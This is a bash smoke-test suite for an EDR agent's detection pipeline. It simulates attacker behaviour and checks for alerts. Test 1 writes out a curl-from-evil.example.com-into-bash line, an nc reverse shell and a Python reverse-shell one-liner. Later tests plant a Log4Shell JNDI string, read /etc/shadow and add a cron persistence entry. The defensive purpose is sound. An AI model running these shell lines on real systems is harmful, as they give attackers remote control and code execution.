#!/usr/bin/env bash
set -euo pipefail

# EDR Detection Test Suite
#
# Runs detection scenario tests by simulating suspicious behavior and
# verifying that the agent generates appropriate alerts. This is a
# smoke-test suite for validating the detection pipeline end-to-end.
#
# Usage:
#   ./scripts/test_detections.sh                    Run all tests
#   ./scripts/test_detections.sh --alert-file PATH  Use custom alert file
#   ./scripts/test_detections.sh --skip-cleanup     Keep test artifacts
#
# Prerequisites:
#   - Agent must be running (edrctl status should show "running")
#   - Alert file must be writable/readable
#   - Some tests require root privileges for process manipulation

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"

ALERT_FILE="${ALERT_FILE:-./alerts/alerts.jsonl}"
SKIP_CLEANUP=false
TEST_DIR="/tmp/edr-test-$$"
PASSED=0
FAILED=0
SKIPPED=0

while [ $# -gt 0 ]; do
    case "$1" in
        --alert-file)
            ALERT_FILE="$2"
            shift 2
            ;;
        --skip-cleanup)
            SKIP_CLEANUP=true
            shift
            ;;
        --help|-h)
            echo "Usage: $0 [--alert-file PATH] [--skip-cleanup]"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# ---------- helpers ----------

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log_pass() {
    echo -e "${GREEN}[PASS]${NC} $1"
    PASSED=$((PASSED + 1))
}

log_fail() {
    echo -e "${RED}[FAIL]${NC} $1"
    FAILED=$((FAILED + 1))
}

log_skip() {
    echo -e "${YELLOW}[SKIP]${NC} $1"
    SKIPPED=$((SKIPPED + 1))
}

log_info() {
    echo -e "       $1"
}

count_alerts_since() {
    local marker_time="$1"
    local pattern="${2:-}"

    if [ ! -f "${ALERT_FILE}" ]; then
        echo "0"
        return
    fi

    local count=0
    while IFS= read -r line; do
        local ts
        ts="$(echo "${line}" | grep -o '"timestamp":"[^"]*"' | head -1 | cut -d'"' -f4)"
        if [ -z "${ts}" ]; then
            ts="$(echo "${line}" | grep -o '"time":[0-9]\+' | head -1 | cut -d':' -f2)"
        fi
        if [ -z "${ts}" ]; then
            continue
        fi
        if [ -n "${pattern}" ]; then
            if echo "${line}" | grep -q "${pattern}"; then
                count=$((count + 1))
            fi
        else
            count=$((count + 1))
        fi
    done < "${ALERT_FILE}"
    echo "${count}"
}

wait_for_alert() {
    local pattern="$1"
    local timeout="${2:-10}"
    local interval=1
    local elapsed=0

    while [ ${elapsed} -lt ${timeout} ]; do
        if [ -f "${ALERT_FILE}" ] && tail -20 "${ALERT_FILE}" | grep -q "${pattern}"; then
            return 0
        fi
        sleep ${interval}
        elapsed=$((elapsed + interval))
    done
    return 1
}

# ---------- setup ----------

echo "=============================================="
echo "  EDR Detection Test Suite"
echo "=============================================="
echo ""
echo "Alert file:  ${ALERT_FILE}"
echo "Test dir:    ${TEST_DIR}"
echo ""

mkdir -p "${TEST_DIR}"

INITIAL_ALERT_COUNT=0
if [ -f "${ALERT_FILE}" ]; then
    INITIAL_ALERT_COUNT=$(wc -l < "${ALERT_FILE}" | tr -d ' ')
fi
echo "Initial alert count: ${INITIAL_ALERT_COUNT}"
echo ""

# ---------- Test 1: Suspicious script creation ----------

echo "--- Test 1: Suspicious script creation ---"

SUSPECT_SCRIPT="${TEST_DIR}/payload.sh"
cat > "${SUSPECT_SCRIPT}" <<'SCRIPT'
#!/bin/bash
# Simulated suspicious script for detection testing
curl -s http://evil.example.com/c2 | bash
nc -e /bin/sh 10.0.0.1 4444
python3 -c "import socket,subprocess;s=socket.socket();s.connect(('10.0.0.1',4444));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"
SCRIPT
chmod +x "${SUSPECT_SCRIPT}"

if wait_for_alert "payload.sh" 5; then
    log_pass "Suspicious script creation detected"
else
    log_fail "Suspicious script creation not detected within timeout"
fi

# ---------- Test 2: Log4Shell IOC string (shipped YARA cve_2021_44228_log4j.yar) ----------

echo "--- Test 2: Log4j JNDI IOC string (YARA Log4Shell rule) ---"

LOG4J_PROBE="${TEST_DIR}/log4j_yara_probe.txt"
printf '%s\n' '${jndi:ldap://127.0.0.1/edr-test-probe}' > "${LOG4J_PROBE}"

if wait_for_alert "Log4Shell" 8; then
    log_pass "Log4Shell YARA probe matched (shipped Exploit_CVE_2021_44228_Log4Shell)"
else
    log_skip "Log4Shell YARA (ensure agent scans file events with rules/yara loaded)"
fi

# ---------- Test 3: Suspicious process name patterns ----------

echo "--- Test 3: Suspicious process execution patterns ---"

MIMIKATZ_SIM="${TEST_DIR}/mimikatz_sim"
cat > "${MIMIKATZ_SIM}" <<'EOF'
#!/bin/sh
echo "simulated suspicious process"
sleep 1
EOF
chmod +x "${MIMIKATZ_SIM}"
"${MIMIKATZ_SIM}" &
SIM_PID=$!
wait ${SIM_PID} 2>/dev/null || true

if wait_for_alert "mimikatz" 5; then
    log_pass "Suspicious process name detected"
else
    log_skip "Suspicious process name detection (agent may use different heuristics)"
fi

# ---------- Test 4: High-entropy file creation (ransomware simulation) ----------

echo "--- Test 4: High-entropy file creation ---"

ENTROPY_DIR="${TEST_DIR}/encrypted_files"
mkdir -p "${ENTROPY_DIR}"
for i in $(seq 1 5); do
    dd if=/dev/urandom of="${ENTROPY_DIR}/file${i}.encrypted" bs=1024 count=10 2>/dev/null
done

if wait_for_alert "ransomware\|entropy\|encrypt" 5; then
    log_pass "High-entropy file creation detected (ransomware pattern)"
else
    log_skip "Ransomware-pattern file creation (may need behavioral baseline)"
fi

# ---------- Test 5: Known malicious hash ----------

echo "--- Test 5: Known IOC hash check ---"

IOC_FILE="${TEST_DIR}/known_malware.bin"
echo "known_malware_payload_for_hash_testing_only" > "${IOC_FILE}"

if wait_for_alert "ioc\|hash" 5; then
    log_pass "IOC hash match detected"
else
    log_skip "IOC hash detection (requires populated hash database)"
fi

# ---------- Test 6: Suspicious network connection attempt ----------

echo "--- Test 6: Suspicious outbound connection ---"

if command -v nc >/dev/null 2>&1 || command -v ncat >/dev/null 2>&1; then
    timeout 2 nc -z 10.0.0.1 4444 2>/dev/null || true

    if wait_for_alert "network\|c2\|suspicious" 5; then
        log_pass "Suspicious network connection detected"
    else
        log_skip "Suspicious network detection (requires network monitoring)"
    fi
else
    log_skip "Suspicious outbound connection (nc/ncat not available)"
fi

# ---------- Test 7: Credential file access ----------

echo "--- Test 7: Credential file access simulation ---"

if [ -f /etc/shadow ]; then
    cat /etc/shadow >/dev/null 2>&1 || true
    if wait_for_alert "shadow\|credential\|passwd" 5; then
        log_pass "Credential file access detected"
    else
        log_skip "Credential file access (may need audit rules)"
    fi
else
    log_skip "Credential file access (not running on Linux or not root)"
fi

# ---------- Test 8: Process injection simulation ----------

echo "--- Test 8: Process injection pattern ---"

INJECTOR="${TEST_DIR}/injector_sim.sh"
cat > "${INJECTOR}" <<'EOF'
#!/bin/sh
# Simulates ptrace-based process attachment pattern
echo "ptrace attach simulation" > /dev/null
EOF
chmod +x "${INJECTOR}"
"${INJECTOR}" 2>/dev/null || true

if wait_for_alert "ptrace\|inject" 5; then
    log_pass "Process injection pattern detected"
else
    log_skip "Process injection detection (requires eBPF/ptrace monitoring)"
fi

# ---------- Test 9: Lateral movement simulation ----------

echo "--- Test 9: Lateral movement patterns ---"

LATERAL="${TEST_DIR}/lateral_sim.sh"
cat > "${LATERAL}" <<'EOF'
#!/bin/sh
# Simulates lateral movement scanning patterns
for port in 22 445 3389 5985; do
    timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/${port}" 2>/dev/null || true
done
EOF
chmod +x "${LATERAL}"
"${LATERAL}" 2>/dev/null || true

if wait_for_alert "lateral\|scan\|port" 5; then
    log_pass "Lateral movement pattern detected"
else
    log_skip "Lateral movement detection (requires network baseline)"
fi

# ---------- Test 10: Persistence mechanism ----------

echo "--- Test 10: Persistence mechanism simulation ---"

PERSIST_DIR="${TEST_DIR}/cron_persist"
mkdir -p "${PERSIST_DIR}"
cat > "${PERSIST_DIR}/malicious_cron" <<'EOF'
* * * * * /tmp/edr-test-beacon.sh
EOF

if wait_for_alert "persist\|cron\|schedule" 5; then
    log_pass "Persistence mechanism detected"
else
    log_skip "Persistence detection (requires file monitoring on cron paths)"
fi

# ---------- cleanup ----------

if [ "${SKIP_CLEANUP}" = false ]; then
    echo ""
    echo "==> Cleaning up test artifacts"
    rm -rf "${TEST_DIR}"
fi

# ---------- summary ----------

FINAL_ALERT_COUNT=0
if [ -f "${ALERT_FILE}" ]; then
    FINAL_ALERT_COUNT=$(wc -l < "${ALERT_FILE}" | tr -d ' ')
fi
NEW_ALERTS=$((FINAL_ALERT_COUNT - INITIAL_ALERT_COUNT))

echo ""
echo "=============================================="
echo "  Test Results"
echo "=============================================="
echo -e "  Passed:  ${GREEN}${PASSED}${NC}"
echo -e "  Failed:  ${RED}${FAILED}${NC}"
echo -e "  Skipped: ${YELLOW}${SKIPPED}${NC}"
echo "  New alerts generated: ${NEW_ALERTS}"
echo "=============================================="
echo ""

if [ ${FAILED} -gt 0 ]; then
    echo "Some tests failed. Review the alert file: ${ALERT_FILE}"
    exit 1
fi

exit 0
